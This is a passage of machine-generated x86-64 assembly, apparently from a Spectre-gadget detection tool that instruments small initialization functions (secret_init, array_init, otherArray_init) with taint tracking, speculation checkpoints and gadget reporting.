            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___129:

            nop
            movq (instruction_cnt),%rdi
            addq $3,%rdi
            cmpq $250,%rdi
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rdi,(instruction_cnt)
            testq %rax,%rax
            leaq (.__trampoline__2349f3b9_d480_4280_a9a2_353d9ea4c4c9__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___131)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__2349f3b9_d480_4280_a9a2_353d9ea4c4c9__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___131:

            nop
            je .L_13a6__teapot__
.L__trampoline_target__9ff78411_1d6f_4341_bf42_3857855f3c85__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $65,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            xorl %esi,%esi
            orb (dift_reg_tags),%sil
            leaq (%rax),%rdi
            btcq $45,%rdi
            movq (memory_history_top),%rax
            movq (%rdi),%rdx
            movq %rdi,(%rax)
            movq %rdx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb %sil,(%rdi)
            addq $8,%rdi
.L__dift_done__teapot___133:

            nop
            movq (scratchpad+524288),%rax
            leaq (%rax),%rdx
            movq (memory_history_top),%rdi
            movq (%rdx),%rsi
            movq %rdx,(%rdi)
            movq %rsi,8(%rdi)
            leaq 16(%rdi),%rdi
            movq %rdi,(memory_history_top)
            movb $65,(%rax)
            xorl %edx,%edx
            orb (dift_reg_tags),%dl
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___135:

            nop
            movq %rax,%rdx
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+4)
.L__dift_done__teapot___136:

            nop
            leaq (.L_202b)(%rip),%rsi
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___137:

            nop
            movl $1,%edi
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___138:

            nop
            movq (scratchpad+524288),%rbx
            movl $0,%eax
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L__ret_transform_target_secret_init__19814f19_28fe_401c_a0bd_cf2dca4fd3d5__teapot__:
.L_13a1__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $69,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+1),%al
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___142:

            nop
            movq (scratchpad+524288),%rbx
            movq %rbx,%rax
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %ebx,%ebx
            orb (%rax),%bl
            movb %bl,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___143

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%rcx
            orb %bl,(dift_reg_tags)(%rcx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___143:

            nop
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            popq %rbx
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___146

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___146:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_13a6__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $68,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___148:

            nop
            leaq (.L_2015)(%rip),%rdi
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq perror@PLT
.L__ret_transform_target_secret_init__7cb22c7a_d2bd_47d1_a87a_953a40ef4a41__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $66,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            jmp .L_13a1__teapot__
.size secret_init__teapot__, . - secret_init__teapot__
array_init__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rdi
            movq %rbx,(%rax)
            movq %rdi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $102,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %edi,%edi
            orb (dift_reg_tags+1),%dil
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdi
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdi,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___155:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rdi
            movq %rbx,(%rax)
            movq %rdi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %rbx
            movq %rax,(scratchpad+524288)
            leaq (array_size)(%rip),%rax
            btcq $45,%rax
            xorl %ebx,%ebx
            orb (%rax),%bl
            movb %bl,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___157

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%rdi
            orb %bl,(dift_reg_tags)(%rdi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___157:

            nop
            movq (scratchpad+524288),%rax
            movl (array_size)(%rip),%edi
            movl %edi,%edi
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rax
            movq (%rcx),%rbx
            movq %rcx,(%rax)
            movq %rbx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq malloc@PLT
.L__ret_transform_target_array_init__fa28af4d_7400_489c_a6f6_2260c9c35214__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $100,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %ebx,%ebx
            orb (dift_reg_tags),%bl
            movb %bl,(dift_reg_tags+1)
.L__dift_done__teapot___161:

            nop
            movq %rax,%rbx
            xorl %edi,%edi
            orb (dift_reg_tags),%dil
            orb (dift_reg_tags),%dil
            testb $48,%dil
            je .L__check_ok__teapot___162

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___162:

            nop
            movq (instruction_cnt),%rdi
            addq $3,%rdi
            cmpq $250,%rdi
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rdi,(instruction_cnt)
            testq %rax,%rax
            leaq (.__trampoline__001696f8_80c8_4f62_9bee_301421d5978b__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___164)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__001696f8_80c8_4f62_9bee_301421d5978b__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___164:

            nop
            je .L_1401__teapot__
.L__trampoline_target__c2dcdedb_dcda_439c_b4c2_d7d3aa7f0cb9__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $99,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq (array_size)(%rip),%rdi
            btcq $45,%rdi
            xorl %esi,%esi
            orb (%rdi),%sil
            movb %sil,(dift_reg_tags+3)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___166

            movb (dift_reg_queued_tag),%sil
            movzbq (dift_reg_queued_id),%rdx
            orb %sil,(dift_reg_tags)(%rdx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___166:

            nop
            movl (array_size)(%rip),%edx
            movl %edx,%edx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___167:

            nop
            movl $45,%esi
            movq %rax,(scratchpad+524288)
            xorl %edi,%edi
            orb (dift_reg_tags),%dil
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___168:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,%rdi
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq memset__dift_wrapper__@PLT
.L__ret_transform_target_array_init__fddc7a08_641a_4520_a556_ca2a10fef480__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $103,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %eax,%eax
            orb (dift_reg_tags+1),%al
            movb %al,(dift_reg_tags+3)
.L__dift_done__teapot___172:

            nop
            movq %rbx,%rdx
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+4)
.L__dift_done__teapot___173:

            nop
            leaq (.L_2042)(%rip),%rsi
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___174:

            nop
            movl $1,%edi
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___175:

            nop
            movq (scratchpad+524288),%rbx
            movl $0,%eax
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L_13fc__teapot__:
.L__ret_transform_target_array_init__6c94379d_7706_46f5_a1ca_b0560cda7a49__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $104,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+1),%al
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___179:

            nop
            movq (scratchpad+524288),%rbx
            movq %rbx,%rax
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %ebx,%ebx
            orb (%rax),%bl
            movb %bl,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___180

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%rcx
            orb %bl,(dift_reg_tags)(%rcx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___180:

            nop
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            popq %rbx
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___183

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___183:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_1401__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $105,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___185:

            nop
            leaq (.L_2015)(%rip),%rdi
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq perror@PLT
.L__ret_transform_target_array_init__73b53f4b_ff86_42ce_93ea_e27f54d753db__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $101,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            jmp .L_13fc__teapot__
.size array_init__teapot__, . - array_init__teapot__
otherArray_init__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $97,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+13),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___192:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %r13
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %r13d,%r13d
            orb (dift_reg_tags+12),%r13b
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%r13
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %r13,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___194:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%r13
            movq %rbx,(%rax)
            movq %r13,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %r12
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %r13d,%r13d
            orb (dift_reg_tags+7),%r13b
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%r12
            imulq %r12,%r13
            movq (memory_history_top),%rax
            movq (%rbx),%r12
            movq %rbx,(%rax)
            movq %r12,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %r13,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___196:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            leaq -8(%rsp),%r12
            movq (memory_history_top),%rax
            movq (%r12),%r13
            movq %r12,(%rax)
            movq %r13,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524288),%rax
            pushq %rbp
            movq %rax,(scratchpad+524288)
            xorl %ebp,%ebp
            orb (dift_reg_tags+1),%bpl
            leaq -8(%rsp),%r12
            btcq $45,%r12
            movabsq $72340172838076673,%r13
            imulq %r13,%rbp
            movq (memory_history_top),%rax
            movq (%r12),%r13
            movq %r12,(%rax)
            movq %r13,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rbp,(%r12)
            addq $8,%r12
.L__dift_done__teapot___198:

            nop
            movq (scratchpad+524288),%rax
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            pushq %rbx
            subq $8,%rsp
            xorl %r13d,%r13d
            orb (dift_reg_tags+4),%r13b
            movb %r13b,(dift_reg_tags+7)
.L__dift_done__teapot___200:

            nop
            movl %esi,%ebp
            xorl %r13d,%r13d
            orb (dift_reg_tags+3),%r13b
            movb %r13b,(dift_reg_tags+13)
.L__dift_done__teapot___201:

            nop
            movl %edx,%r13d
            xorl %ebx,%ebx
            orb (dift_reg_tags+5),%bl
            movb %bl,(dift_reg_tags+12)
.L__dift_done__teapot___202:

            nop
            movl %edi,%r12d
            xorl %ebx,%ebx
            orb (dift_reg_tags+12),%bl
            movb %bl,(dift_reg_tags+5)
.L__dift_done__teapot___203:

            nop
            movq %r12,%rdi
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rax
            movq (%rcx),%rbx
            movq %rcx,(%rax)
            movq %rbx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq malloc@PLT
.L__ret_transform_target_otherArray_init__643980ef_5071_4300_a67b_3238470ceaf1__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $93,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %ebx,%ebx
            orb (dift_reg_tags),%bl
            movb %bl,(dift_reg_tags+1)
.L__dift_done__teapot___207:

            nop
            movq %rax,%rbx
            xorl %edi,%edi
            orb (dift_reg_tags),%dil
            orb (dift_reg_tags),%dil
            testb $48,%dil
            je .L__check_ok__teapot___208

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___208:

            nop
            movq (instruction_cnt),%rdi
            addq $3,%rdi
            cmpq $250,%rdi
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rdi,(instruction_cnt)
            testq %rax,%rax
            leaq (.__trampoline__f3d0f919_f7e0_480f_9dfd_b16b351dfcd9__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___210)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__f3d0f919_f7e0_480f_9dfd_b16b351dfcd9__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___210:

            nop
            je .L_1472__teapot__
.L__trampoline_target__945a069b_47d2_45be_9a5e_55a7294f34ef__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $96,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+12),%dl
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___212:

            nop
            movq %r12,%rdx
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+4)
.L__dift_done__teapot___213:

            nop
            movl $45,%esi
            xorl %edi,%edi
            orb (dift_reg_tags),%dil
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___214:

            nop
            movq %rax,%rdi
            movq %rbx,(scratchpad+524288)
            leaq -8(%rsp),%r12
            movq (memory_history_top),%rbx
            movq (%r12),%rax
            movq %r12,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq memset__dift_wrapper__@PLT
.L__ret_transform_target_otherArray_init__1fc018ef_6d86_4e98_a273_c7541f5de497__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $95,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movl %ebp,%ebp
            xorl %edi,%edi
            orb (dift_reg_tags+7),%dil
            orb (dift_reg_tags+13),%dil
            orb (dift_reg_tags+1),%dil
            leaq (%rbx,%rbp),%rsi
            btcq $45,%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%rdx
            movq %rsi,(%r12)
            movq %rdx,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movb %dil,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___218:

            nop
            leaq (%rbx,%rbp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%rdx
            movq %rsi,(%r12)
            movq %rdx,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movb %r13b,(%rbx,%rbp)
            xorl %esi,%esi
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___220:

            nop
            movq %rbx,%rdx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___221:

            nop
            leaq (.L_203c)(%rip),%rsi
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags+5)
.L__dift_done__teapot___222:

            nop
            movl $1,%edi
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___223:

            nop
            movl $0,%eax
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L_1464__teapot__:
.L__ret_transform_target_otherArray_init__cefd4c2d_ebe6_4bb3_a111_64de12342510__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $94,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r13d,%r13d
            orb (dift_reg_tags+1),%r13b
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___227:

            nop
            movq %rbx,%rax
            addq $8,%rsp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %ebp,%ebp
            orb (%r12),%bpl
            movb %bpl,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___228

            movb (dift_reg_queued_tag),%bpl
            movzbq (dift_reg_queued_id),%r13
            orb %bpl,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___228:

            nop
            popq %rbx
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %ebp,%ebp
            orb (%r12),%bpl
            movb %bpl,(dift_reg_tags+7)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___229

            movb (dift_reg_queued_tag),%bpl
